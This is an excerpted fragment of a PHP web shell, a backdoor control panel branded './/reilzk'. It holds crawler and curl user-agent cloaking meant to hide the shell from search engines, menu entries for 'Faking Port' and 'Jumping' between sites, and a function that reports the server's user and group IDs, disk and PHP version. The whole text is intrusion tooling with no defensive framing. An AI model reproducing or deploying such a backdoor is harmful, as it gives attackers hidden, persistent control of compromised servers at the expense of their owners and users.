...
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("PycURL", "Slurp", "MSNBot", "Googlebot", "YahooSeeker", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "facebookexternalhit", "bingbot", "curl");
...
<html>
  ...
  <body class="grey lighten-2">
    <ul id="dropdown1" class="dropdown-content">
      ...
      <li><a href="#!">Faking Port</a></li>
      <li><a href="#!">Jumping</a></li>
    </ul>
    <nav>
      <div class="nav-wrapper teal darken-3">
        <a href="#" class="brand-logo">.//reilzk</a>
...
function serverinfo1() {
  ...
  $output[] = "User / Group: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
	$output[] = "Disk        : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
  $output[] = "PHP -v : ".color(1, 2, @phpversion());
